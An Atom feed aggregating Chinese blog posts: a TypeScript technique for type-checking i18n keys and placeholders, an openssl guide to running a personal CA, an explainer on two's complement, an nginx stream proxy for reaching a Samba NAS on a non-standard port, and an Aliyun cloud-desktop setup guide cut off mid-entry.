<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <generator>NUAA</generator>
    <id>https://blogroll.a2os.club</id>
    <title>NUAARSS</title>
    <updated>2021-02-23T12:15:28+08:00</updated>
    <link href="https://blogroll.a2os.club"/>
    <author>
        <name>NUAARSS</name>
    </author>
    
    
    <entry>
        <id>https://blog.rexskz.info/typescript-hint-validate-i18n-params.html</id>
        <title><![CDATA[TypeScript 小技巧：校验 i18n 参数]]></title>
        <updated>2021-02-21T08:16:00+08:00</updated>
        <link href="https://blog.rexskz.info/typescript-hint-validate-i18n-params.html"/>
        <content type="text/html" src="https://blog.rexskz.info/typescript-hint-validate-i18n-params.html"><![CDATA[<p>最近我们的某个项目需要支持多语言了。作为一个从 Entry Task 开始就与多语言打过交道的人，我已经对这里面的套路很是熟悉。但是作为一个工程师，还是想着能不能做的更好一些。</p><h1>我们是怎么做国际化的</h1><p>对于大部分场景来说，国际化都相当简单：有若干语言包，每个语言包中是一堆 Key 和对应的文字模板，模板中可能会有占位符。一个语言包可能长这样：</p><pre><code class="lang-json">{
    &quot;user_setting.list.total_users&quot;: &quot;共 {count} 个用户。&quot;,
    &quot;user_setting.edit.confirm&quot;: &quot;确认修改？&quot;,
}</code></pre><p>代码中的用法可能是这样：</p><pre><code class="lang-tsx">const { t } = useTranslation();
return (
    &lt;div className=&quot;total-users&quot;&gt;
        {t('user_setting.list.total_users', { count })}
    &lt;/div&gt;
    &lt;div className=&quot;modal&quot;&gt;
        &lt;div className=&quot;modal-content&quot;&gt;
            {t('user_setting.edit.confirm')}
        &lt;/div&gt;
    &lt;/div&gt;
);</code></pre><p>代码中的 <code>useTranslation</code> 函数可以自己写，也可以调用现成的 i18n 库。至于语言包从何而来，我们有专门的翻译平台，可以直接将项目的多语言数据下载为这种数据格式的 JSON 文件。</p><p>没错，多语言就是这么简单。但是它有一个很致命的痛点：如果我传入的 Key 在语言包中没有（可能是打错了），或者传入的占位符的值出了错（例如需要传 <code>count</code> 我却传了 <code>total</code>），那么只有在界面真正渲染出来的时候，我才能知道这里出错了！这就不得不提到两种错误：编译时检查和运行时检查。</p><h1>编译时检查与运行时检查</h1><p>记得很久之前搞竞赛的时候，学长给我说过一句话：</p><blockquote><p>编译成功并不是结束，而是噩梦的开始。</p></blockquote><p>当时的我深有感触，因为水平太菜，好不容易通过了编译，但运行起来也会经常出问题，例如忘了设置递归边界导致栈溢出，或者莫名其妙就死循环了。那个时候我就有一个疑问：编译是机器来做，设计和运行测试用例是人来做，机器肯定比人做得更好、更全面，所以错误检查让编译器来做肯定是更好的；那么既然编译器可以拿到我的所有代码，为什么不能帮我检查出来这种错误呢？</p><p>后来我知道了一个残酷的现实：<a href="https://zh.wikipedia.org/wiki/%E5%81%9C%E6%9C%BA%E9%97%AE%E9%A2%98">停机问题不可解</a>。语言的灵活性，往往导致很多问题只能在运行时才会暴露出来。</p><p>然而最近两年，我看到了很多利用编译器来检查、优化代码的例子：</p><ul><li>在一次学习 PWN 的过程中，我发现 GCC 在编译时会自动 inline 那些非递归的函数（因为生成物的符号表里没有这个函数了），这可以减少函数调用时的额外开销；</li><li>Svelte 通过限制 JS 的赋值过程，以及使用模板来描述界面而不是 JSX，使得编译器可以直接在变量的修改后面加上修改 DOM 的代码，避免了运行时的 DOM Diff；</li><li>Rust 通过定义“所有权”、“借用”等概念，使得编译器可以知道每个变量的内存何时该被回收，无需 Auto GC 也能保证绝大多数情况下不会出现内存泄漏问题；</li><li>ESLint 通过严格地限定可用的 JS 语法，在编译期间甚至开发期间就可以避免掉很多错误（例如：不小心在 <code>if</code> 中赋值、被万恶的 <code>==</code> 坑、对函数参数的意外修改、打错变量名而生成了全局变量等）。</li></ul><p><img src="https://static.rexskz.info/blog/article/typescript-hint-validate-i18n-params/0.png" alt="各种基于编译器的检查与优化" title="各种基于编译器的检查与优化"></p><p>看来，在特定的语法下，特定的“停机问题”是可以被解决的。那么 i18n 能不能利用编译器做检查呢？</p><h1>基于 TypeScript 的 i18n 校验</h1><p>既然我们的项目用的是 TypeScript，我又刚好对 TypeScript 的类型系统比较熟悉，就想到能否利用它来帮忙检查参数。</p><p>注意到刚刚说到的“特定语法”，不难想出，如果利用 TypeScript 的类型系统来检查参数，需要满足这个条件：参数 <code>key</code> 一定是静态的，不能通过字符串拼接或使用变量的方式。因为一旦这样，TypeScript 就会把参数类型推断成 <code>string</code>，就无法通过具体的字符串来确定占位符类型了。我觉得这个也可以接受，毕竟如果想用 Webpack 做拆包，<code>import</code> 函数的参数也必须是静态字符串，而不能是拼接或变量。</p><p>至于具体的做法，当然是写一个类型生成器，利用语言包文件，生成 <code>types.ts</code> 文件咯！只要能把每个 Key 对应的占位符单独生成一个这样的 interface 就成功了一半：</p><pre><code class="lang-typescript">interface I18nPlaceholder1 {
    current: number | string;
    total: number | string;
}</code></pre><p>这个用正则来做其实非常简单（代码在文章末尾），然后想办法让第二个参数根据第一个参数来选择不同的 interface 即可。</p><p>先放一下效果图吧：</p><p><img src="https://static.rexskz.info/blog/article/typescript-hint-validate-i18n-params/1.png" alt="对 Key 的自动补全" title="对 Key 的自动补全"></p><p><img src="https://static.rexskz.info/blog/article/typescript-hint-validate-i18n-params/2.png" alt="对占位符的校验" title="对占位符的校验"></p><h2>几次失败的尝试</h2><p>“同一个函数支持不同类型的参数”，我的第一反应就是 Overload。但是尝试了一番之后，我发现 Overload 必须使用 <code>function t()</code> 的写法，无法使用箭头函数，并且在最后必须是具体的实现。这对于类型生成器来说是不可接受的。</p><p>于是我又想到了之前写表单组件的方法。我们的表单组件支持传入一个表单配置来生成具体的元素：</p><pre><code class="lang-typescript">const formProps: FormProps = {
    fields: [
        {
            type: 'input',
            label: 'Name',
            ctrlProps: {
                placeholder: 'Input your name',
            },
        },
        {
            type: 'select',
            label: 'Gender',
            ctrlProps: {
                options: [
                    { label: 'Male', value: 0 },
                    { label: 'Female', value: 1 },
                    { label: 'Other', value: 2 },
                ],
            },
        },
    ],
};</code></pre><p>其中 <code>ctrlProps</code> 可以随着 <code>type</code> 而改变。我们当时的写法是这样的：</p><pre><code class="lang-typescript">interface FieldBaseProps {
    label: string;
}

interface FieldInputProps extends FieldBaseProps {
    type: 'input';
    ctrlProps: {
        placeholder?: string;
    };
}

interface FieldSelectProps extends FieldBaseProps {
    type: 'select';
    ctrlProps: {
        options: Array&lt;{
            label: string;
            value: string;
        }&gt;;
    };
}

type FieldProps = FieldInputProps
| FieldSelectProps
| ...;

interface FormProps {
    fields: FieldProps[];
}</code></pre><p>通过复合类型就可以方便地做到这点了。于是我如法炮制：</p><pre><code class="lang-typescript">interface I18nPlaceholder1 { ... }
interface I18nPlaceholder2 { ... }

type _F1 = (key: 'key.1', value: I18nPlaceholder1) =&gt; string;
type _F2 = (key: 'key.2', value: I18nPlaceholder2) =&gt; string;
type _F3 = (key: 'key.3' | 'key.4') =&gt; string;

type TranslateFunc = _F1 | _F2 | _F3;</code></pre><p>结果当我输入 <code>t('</code> 的时候，TypeScript 提示我“不能把字符串传给 <code>never</code>”……看起来 TypeScript 对所有的情况取了交集。</p><h2>一次成功的尝试</h2><p>于是我又去想别的方法，用范型能否实现呢？对于没有占位符的情况来说，确实很简单：</p><pre><code class="lang-typescript">interface I18nPlaceholder1 { ... }
interface I18nPlaceholder2 { ... }

type CombinedArgsWithPlaceholder = {
  'key.1': I18nPlaceholder1;
  'key.2': I18nPlaceholder2;
}

type TranslateFuncWithPlaceholder = &lt;
    T extends keyof CombinedArgsWithPlaceholder
&gt;(
    key: T,
    value: CombinedArgsWithPlaceholder[T]
) =&gt; string;</code></pre><p>这里利用了 <code>T extends keyof</code>，以确保 <code>key</code> 既在指定的范围内，<code>value</code> 又一定随着 <code>key</code> 而改变。</p><p>那么对于没有占位符的元素呢？更简单了：</p><pre><code class="lang-typescript">type CombinedArgsWithoutPlaceholder = 'key.3' | 'key.4';
type TranslateFuncWithoutPlaceholder = (
    key: CombinedArgsWithoutPlaceholder
) =&gt; string;

// 一开始我用了 | 会报错，改成了 &amp; 就可以了。
// TypeScript 把这个理解成了对函数的 Overload，
// 虽然官方文档里没有指出有这种写法……
type TranslateFunc = TranslateFuncWithPlaceholder &amp; TranslateFuncWithoutPlaceholder;</code></pre><p>于是就有了上面截图中的效果。</p><h2>话不多说，上代码</h2><pre><code class="lang-typescript">import { resolve } from 'path';
import { output } from './common';

const commonWarningStr = `/**
 * WARNING
 * This file is auto-generated using:
 * ts-node generate-i18n-types.ts
 * Do not modify its content.
 */
`;

// This file must exists
const langPack = require('path/to/en_US.json');

const keysWithoutPlaceholder: string[] = [];
const interfaces: Record&lt;string, string&gt; = {};
const combinedArgsWithPlaceholder: string[] = [];
let combinedArgsWithoutPlaceholder = '';

// 工具函数
// 用于把 key（abc.def.ghi）转换为 interface name（AbcDefGhi）
const toInterfaceName = (key: string) =&gt; {
    return key.replace(/(?:\.|^)(\w)/g, (_, $1) =&gt; $1.toUpperCase());
};

// 枚举每一个 key
for (const key in langPack) {
    const value: string = langPack[key];
    // 找到模板中所有花括号括起来的文字片段（占位符）
    const match = value.match(/\{[^{}]+?\}/g);
    if (match) {
        // 如果有占位符，则生成一个 interfaces
        const interfaceName = toInterfaceName(key);
        interfaces[key] = [
            `interface ${interfaceName} {`,
            ...match.map(t =&gt; `    ${t.substring(1, t.length - 1)}: string | number;`),
            '}',
        ].join('\n');
        combinedArgsWithPlaceholder.push(`    '${key}': ${interfaceName};`);
    } else {
        // 否则，只是记录一下 key
        keysWithoutPlaceholder.push(`'${key}'`);
    }
}

// 剩下的代码都只是拼装了

if (keysWithoutPlaceholder.length) {
    combinedArgsWithoutPlaceholder = `type CombinedArgsWithoutPlaceholder = ${keysWithoutPlaceholder.join(' | ')};`;
}

const contentStr = [
    commonWarningStr,
    Object.values(interfaces).join('\n'),
    'type CombinedArgsWithPlaceholder = {',
    combinedArgsWithPlaceholder.join('\n'),
    '}',
    combinedArgsWithoutPlaceholder,
    'type TranslateFuncWithPlaceholder = &lt;T extends keyof CombinedArgsWithPlaceholder&gt;(key: T, value: CombinedArgsWithPlaceholder[T]) =&gt; string;',
    'type TranslateFuncWithoutPlaceholder = (key: CombinedArgsWithoutPlaceholder) =&gt; string;',
    'export type TranslateFunc = TranslateFuncWithPlaceholder &amp; TranslateFuncWithoutPlaceholder;',
    '', // the last \n
].join('\n');

output(
    resolve(__dirname, 'types.ts'),
    contentStr,
);</code></pre><h1>后续：突然意识到的问题</h1><p>一天之后，我突然想到：既然 TypeScript 会把两个函数类型的 <code>&amp;</code> 操作理解成对函数的 Overload，那把之前的 <code>_F1</code>、<code>_F2</code> 的那个方法改一改是否可行？</p><p><img src="https://static.rexskz.info/blog/article/typescript-hint-validate-i18n-params/3.png" alt="似乎没有任何问题！" title="似乎没有任何问题！"></p><p>是可行的，而且这样写更容易理解……感觉一天前的我可能遭遇了降智攻击……</p>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/02/15/CTF_2021HgameWeek2/</id>
        <title><![CDATA[CTF | 2021 Hgame Week2 WriteUp]]></title>
        <updated>2021-02-18T08:10:44+08:00</updated>
        <link href="https://miaotony.xyz/2021/02/15/CTF_2021HgameWeek2/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/02/15/CTF_2021HgameWeek2/"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>开门见山，这篇是 Hgame 2021 第二周的 WriteUp 啦。</p>
<p>第一周的详见 <a]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/571</id>
        <title><![CDATA[好累！]]></title>
        <updated>2021-02-17T15:27:33+08:00</updated>
        <link href="https://www.suruifu.com/posts/571"/>
        <content type="text/html" src="https://www.suruifu.com/posts/571"><![CDATA[<p>好累好累好累好累，站都站不住了。哈哈，我发现我站着办公的一个好处，站不住的时候可以躺下来睡觉，还有退路，不至于直接死掉。</p>
<p>要想人前显贵，咱就得人后受罪。在平凡的时候中我就是不平凡的我，无论再累也要坚持，哪怕没人支持，多年后我一定会感谢现在拼命的自己。会挽雕弓如满月，西北望，射天狼。我不会输的，加油！</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2021/02/14/we-are-engaged/</id>
        <title><![CDATA[我们订婚了 We are engaged!]]></title>
        <updated>2021-02-17T12:52:41+08:00</updated>
        <link href="https://blog.vvzero.com/2021/02/14/we-are-engaged/"/>
        <content type="text/html" src="https://blog.vvzero.com/2021/02/14/we-are-engaged/"><![CDATA[<p>2021年2月14日，情人节，农历正月初三，玲玲与瑾瑾喜订良缘。</p><p>互联网是有记忆的，在此，我就以计算机为担保，依网络见证！</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2021/01/24/Become-a-CA-and-generate-self-signed-certificate/</id>
        <title><![CDATA[如何成为 CA，并签发自己的证书]]></title>
        <updated>2021-02-17T12:52:41+08:00</updated>
        <link href="https://blog.vvzero.com/2021/01/24/Become-a-CA-and-generate-self-signed-certificate/"/>
        <content type="text/html" src="https://blog.vvzero.com/2021/01/24/Become-a-CA-and-generate-self-signed-certificate/"><![CDATA[<blockquote><p>要读懂此文章，你需要了解对称加密、非对称加密的基本概念，并了解证书签发的基本流程。</p></blockquote><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ol><li>一台 Linux 主机</li><li>openssl</li></ol><h2 id="创建-CA-的私钥"><a href="#创建-CA-的私钥" class="headerlink" title="创建 CA 的私钥"></a>创建 CA 的私钥</h2><p>很容易理解，CA 也有自己的公钥和私钥。</p><p><code>openssl genrsa -des3 -out CAPrivate.key 2048</code></p><p>这个命令会生成一个私钥 <code>CAPrivate.key</code>，并且必须要填写私钥的密码。可以将 2048 改成 4096。不要奇怪这里只有一个私钥，其实公钥也保存在这个文件里了。</p><h2 id="创建根证书"><a href="#创建根证书" class="headerlink" title="创建根证书"></a>创建根证书</h2><p><code>openssl req -x509 -new -nodes -key CAPrivate.key -sha256 -days 365 -out CAPrivate.pem</code></p><p>根证书，顾名思义，肯定是自签发的。这个证书待会需要安装到你的终端设备里面，不然靠这个根证书签发的其他证书不会被信任。</p><p>这个命令里面需要填写很多信息，按照实际填写就好。</p><p>至此，作为一个简单的 CA，所有的文件都已经齐全了。</p><h2 id="创建待签发证书的私钥"><a href="#创建待签发证书的私钥" class="headerlink" title="创建待签发证书的私钥"></a>创建待签发证书的私钥</h2><p>这个私钥与 CA 无关，是待签发的下一级证书。这一步和下一步可以在另一台机器上完成，然后把文件传给保存 CA 信息的机器就好。</p><p><code>openssl genrsa -out MyPrivate.key 2048</code></p><p>同样，可以把 2048 改成 4096。</p><h2 id="创建-CSR"><a href="#创建-CSR" class="headerlink" title="创建 CSR"></a>创建 CSR</h2><p>可以理解为一个待发送给 CA、为你签发证书的一个请求。</p><p><code>openssl req -new -key MyPrivate.key -out MyRequest.csr</code></p><p>同样，这里需要填写很多信息，需要注意的是 <code>Common Name</code> 这个项目，如果你的证书是给 https 用的，这里就填你的域名。</p><h2 id="使用-CA-的私钥签发证书"><a href="#使用-CA-的私钥签发证书" class="headerlink" title="使用 CA 的私钥签发证书"></a>使用 CA 的私钥签发证书</h2><p><code>openssl x509 -req -in MyRequest.csr -CA CAPrivate.pem -CAkey CAPrivate.key -CAcreateserial -out X509Certificate.crt -days 365 -sha256</code></p><h2 id="试一试刚刚签发的证书"><a href="#试一试刚刚签发的证书" class="headerlink" title="试一试刚刚签发的证书"></a>试一试刚刚签发的证书</h2><ol><li>在待测试终端设备上安装 CA 的根证书 <code>CAPricate.pem</code>，比如 Windows、Android，某些浏览器必须单独安装证书。</li><li>把 <code>MyPrivate.key</code> 和 <code>X509Certificate.crt</code> 作为 HTTPS 服务（比如 Nginx）的私钥和证书，写好配置文件。</li><li>在浏览器里面试试看，应该可以显示小锁，且没有安全警告。</li></ol><p>你可以试试安装 <a href="https://source.vvzero.com/CAPrivate.pem">我的证书</a> ，并尝试访问 <a href="https://private.vvzero.com/">https://private.vvzero.com</a> .</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/11/18/May-be-I-know-why-use-complement/</id>
        <title><![CDATA[我终于知道了补码的意义]]></title>
        <updated>2021-02-17T12:52:41+08:00</updated>
        <link href="https://blog.vvzero.com/2020/11/18/May-be-I-know-why-use-complement/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/11/18/May-be-I-know-why-use-complement/"><![CDATA[<blockquote><p>本文供初学者学习，供大佬批判。</p></blockquote><h2 id="补码背景"><a href="#补码背景" class="headerlink" title="补码背景"></a>补码背景</h2><p>很久很久以前，当我参加 NOIP（信息学奥林匹克竞赛）的时候，老师是这么讲补码的：</p><blockquote><p>int 型数据的最高位是符号位，符号位为 0 就代表这是正数，为 1 就是负数。但是，+0 和 -0 理应是同一个数，但在二进制中却表示成了两个不同的数（以 8 位为例，二进制表示）： 00000000 和 10000000。所以，我们引入了补码，补码就是，对负数而言，符号位不变，其他位取反，然后再加 1。于是， -0 的补码就是 10000000 -&gt; 11111111 -&gt; 00000000 与 +0 一致了。</p></blockquote><h2 id="补码的意义"><a href="#补码的意义" class="headerlink" title="补码的意义"></a>补码的意义</h2><p>其实当时我就该意识到，仅仅为了 0 这一个数便创建了“补码”这个概念，未免太浪费了。我最近看了 <em>CS: APP</em> 这本书，才进一步理解了补码。</p><p>补码，就是为有符号整数而创建的概念。对于无符号整数，是不存在“补码”的概念的。我们先看一个无符号数 00100101，它是怎么转换成十进制的？加权求和，<code>0×2^7+0×2^6+1×2^5+0×2^4+0×2^3+1×2^2+0×2^1+1×2^0=37</code>；无符号数 10000011，<code>1×2^7+0×2^6+0×2^5+0×2^4+0×2^3+0×2^2+1×2^1+1×2^0=131</code>。</p><p>对于有符号数呢？假如我们不用补码，那么有符号数 10000011，就是 <code>-(0×2^6+0×2^5+0×2^4+0×2^3+0×2^2+1×2^1+1×2^0)=-3</code>。人这么算起来是挺舒服，但是计算机会很难受，凭什么我最高位的权值没了？只能做符号？</p><p>然后我们试试补码。10000011 的补码是 11111101，如何用补码求它的十进制呢？其实这跟无符号数是一样的，只不过，最高位的权值，不是 2^7，而是 -2^7。求值：<code>1×(-2^7)+1×2^6+1×2^5+1×2^4+1×2^3+1×2^2+0×2^1+1×2^0=-3</code>，是不是很神奇？</p><p>对于正数而言，就更简单了，与无符号数一致。</p><h2 id="补码再探"><a href="#补码再探" class="headerlink" title="补码再探"></a>补码再探</h2><p>计算机只能做加法（不是），所以，我们看看用补码做加法，有什么好处。</p><p>先计算 -13+10 吧，很简单的二进制竖式加法：</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>1</td></tr></tbody></table><p>11111101 即为 -3 的补码。</p><p>再算一个，-8+9：</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr></tbody></table><p>神奇吗？最高位的 0 不见了，变成正数 1 了。</p><h2 id="补码小结"><a href="#补码小结" class="headerlink" title="补码小结"></a>补码小结</h2><p>补码，就是计算机内部有符号数的存储方式，我们不要认为补码是由原码“转换”而来的，补码本来就代表了实际的数字，11111101 == -3，就这样。</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/</id>
        <title><![CDATA[使用虚拟机绕过 Windows Samba 客户端端口限制]]></title>
        <updated>2021-02-17T12:52:41+08:00</updated>
        <link href="https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>迫于不能浪费宿舍联通宽带的公网 IP，我用树莓派搭建了一个 NAS，使用 Samba 提供访问。但是，由于运营商限制，入站和出站的 139、445 端口都被封禁（对！你不能访问其他机器的 445 端口！），这样做只能让同一个局域网的服务访问。我尝试修改了端口号，把本地的 445 端口映射到公网的其它端口，算是可以给大部分 Samba 客户端使用了（比如安卓手机）。但是，Windows 的 Samba 客户端，并不支持设置端口号（如果在文件管理器地址栏输入 <code>\\a.b.c.d:xxx</code> 将会被认为是 WebDAV 协议）。</p><p>网上某些教程说，在 Windows 本地设置端口转发，把访问本机 445 端口的流量转发至你的 Samba 服务器端口。但是，这样做需要关闭 Windows 自己的 Samba 服务器，会导致网络共享、网络打印机等很多功能无法使用，导致莫名其妙的问题，所以不推荐。</p><p>但是可以换个思路。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>既然不能使用本机（127.0.0.1）做转发，那么为什么不使用本地网络中其他的机器进行数据转发呢？一开始我想在本地网络中加一个树莓派之类的小主机，但觉得这样太累赘了。虚拟机也是独立的机器，我觉得一样有效。</p><p>所以，只要在虚拟机里面装一个反向代理应用（Nginx），把发往虚拟机 445 端口的流量转发到 Samba 服务器，然后使用 Windows Samba 客户端访问这个虚拟机，就等于访问 Samba 服务器。</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>这里，我使用了 Windows Hyper V，创建了 Ubuntu 20.04 Server 虚拟机（直接下载官方 ISO），然后使用默认交换机作为虚拟机的网络。</p><img src="https://img.vvzero.com/blog/ih/2020/04/28/2416a9e0b66ec.png" alt="Snipaste_2020-04-28_14-07-57.png" style="zoom:33%;" /><p>启动后，安装系统，然后除了更新镜像源、安装 Nginx，什么都不用做。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure><p>装好 Nginx 后，修改配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><p>添加一个 stream 模块，大致像下面：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">445</span>;</span><br><span class="line">        </span><br><span class="line">        // 你的 NAS 地址</span><br><span class="line">        <span class="attribute">proxy_pass</span> mynas.example.com:<span class="number">12345</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重启 Nginx：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><p>转发的模块就做好了。</p><p>然后，再在 Windows 中打开 <code>\\&lt;虚拟机的ip&gt;\&lt;samba 路径（可选）&gt;</code> 就完成了。虚拟机 ip 可以在虚拟机里面用 ifconfig 命令查看。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>也许可以用 docker 实现，但我还没想好怎么搞。</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/</id>
        <title><![CDATA[使用阿里云 ECS 搭建廉价的高性能云桌面]]></title>
        <updated>2021-02-17T12:52:41+08:00</updated>
        <link href="https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/"><![CDATA[<blockquote><p>要想读懂本文，你需要：</p><ol><li>了解阿里云等云服务的基本 WEB 界面操作；</li><li>了解 Windows 操作系统的中阶操作；</li><li>了解基础的软件开发术语。</li></ol></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文面向的是需要使用高性能计算设备，但是身边只有低性能PC机的群体。最近由于 NCP 疫情，出不了门，返回不了工作地，想必不少人的高性能计算设备（好电脑）没带回家，但是，肯定也有人跟我一样，受不了笔记本电脑的龟速。</p><p>我的配置需求是，能够流畅运行安装多个插件的 VSCode、能够同时打开数十个 Firefox 标签页、能够快速完成 node 项目构建。但是我身边只有一台五年前的 intel NUC (i3-4010U, 4GB RAM)。</p><p>在详细了解了各大云服务商的云计算平台后，个人排除了华为云（弹性计算服务价格较高、云桌面售罄）、腾讯云（云计算服务类别过少）、天翼云（云桌面需要安装指定 APP 且性能不满足要求），决定使用阿里云的云计算服务。</p><h2 id="使用阿里云初步搭建云桌面"><a href="#使用阿里云初步搭建云桌面" class="headerlink" title="使用阿里云初步搭建云桌面"></a>使用阿里云初步搭建云桌面</h2><p>经过权衡，我决定使用阿里云 ESC “抢占式实例”付费模式下的“突发性能实例”。为什么这么选？</p><p>因为没钱……</p><p>开玩笑的。我觉得这是我需求下的合理选择方式。为什么选择“抢占式实例”？首先，我们复工的时间还是个未知数，而且可能随时就不想用这个云桌面了。“抢占式实例”是按量付费的一种，也就是，用多长时间给多少钱。并且，相对于按量付费，有相当大的折扣。<strong>“抢占式实例”的最大问题在于，这是竞价模式。也就是说，当别人出价比你高的时候，或者阿里云供给紧张而你又给钱给得不够的时候，它会自动帮你释放。我了解的是，在释放前5分钟，阿里云会有提醒。</strong>为了尽量避免实例被自动释放，我选择了“使用自动出价”，也就是说，系统会每小时自动判断当前时间该实例的价格，并选择一个高于市场均价的价格进行付费。<strong>但是，这并不是万无一失，阿里云在供给紧张的时候，仍然会将实例释放。</strong>所以，在处理重要数据时，应该随时备份。我的处理方法是，随时将代码提交到我的 Git 仓库。</p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/ea3d50f39b198.png" alt="Snipaste_2020-02-09_17-32-20.png"></p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/df1fabf212984.png" alt="Snipaste_2020-02-09_17-34-24.png"></p><p>如果要保证不会被释放，建议使用包年包月制。</p><p>为什么使用“突发性能实例”？因为个人电脑与服务器不同。个人电脑不会时时刻刻占用大量 CPU，CPU使用率是离散化的，所以 CPU 的使用积分，我觉得是用不完，25% 的使用基线，完全够用。</p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/d74c0622ec620.png" alt="Snipaste_2020-02-09_17-34-05.png"></p><p>哎，目前好像国内也只有阿里云能做出“抢占式实例”和“突发性能实例”。</p><p>其他的配置就简单了，区域选择靠近你的（不同地区的价格好像差别挺大），镜像选择 Windows Server，另外，SSD 是很关键的，我觉得现在已经没有多少人能忍受机械硬盘的龟速了。</p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/6ae75caa75c6a.png" alt="Snipaste_2020-02-09_18-03-26.png"></p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/cbe75edc3c797.png" alt="Snipaste_2020-02-09_17-36-25.png"></p><p>在下一个页面配置网络，为了保证远程桌面流畅，按使用流量计费，带宽拉满！</p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/2c112190ea447.png" alt="Snipaste_2020-02-09_17-45-57.png"></p><p>最终，我的配置如下：</p><ul><li>4核16GB，25% 平均CPU 计算性能；</li><li>100Mbps 按流量付费网络；</li><li>80GB SSD；</li><li>Windows Server 2019 数据中心版；</li></ul><p>这样的话，实例价格为 0.412 元每小时（我选的是上海区的，其他区的可能更便宜，在深夜、早上也会更便宜），流量费用为 0.8 元每 GB。算一算，一天大概要 10 元，一个月大概要 300 元，是不是还是有点贵？没关系，继续看。</p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/ecfef72872df3.png" alt="Snipaste_2020-02-09_17-36-50.png"></p><h2 id="价格的进一步优化"><a href="#价格的进一步优化" class="headerlink" title="价格的进一步优化"></a>价格的进一步优化</h2><p>现在我已经启动了这个实例：</p><p><img 